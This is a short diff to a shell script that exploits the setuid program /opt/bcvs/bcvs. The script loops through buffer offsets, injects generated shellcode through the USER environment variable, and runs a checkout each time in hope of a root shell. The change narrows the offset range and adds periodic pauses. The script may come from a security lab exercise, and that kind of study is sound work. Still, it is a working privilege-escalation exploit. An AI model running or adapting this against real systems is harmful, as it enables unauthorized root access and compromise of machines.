@@ -93,11 +93,15 @@ echo "junk" > "dummy_input"
 echo "hey" > "haxor"
 /opt/bcvs/bcvs ci haxor < dummy_input
 
-while [ "$OFFSET" -le 500 ]
-do
+while [[ $OFFSET -le 200 ]]; do
 SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
 export USER=${SHELL_CODE}
-/opt/bcvs/bcvs co blah < dummy_input
+/opt/bcvs/bcvs co haxor < dummy_input
+
+if [[ $(( OFFSET % 25 )) -eq 0 ]]; then
+  echo "Sleeping for 2 seconds to give a chance to escape"
+  /bin/sleep 2
+fi
 ((OFFSET++))
 done
 # And then hopefully you have a root shell at this point
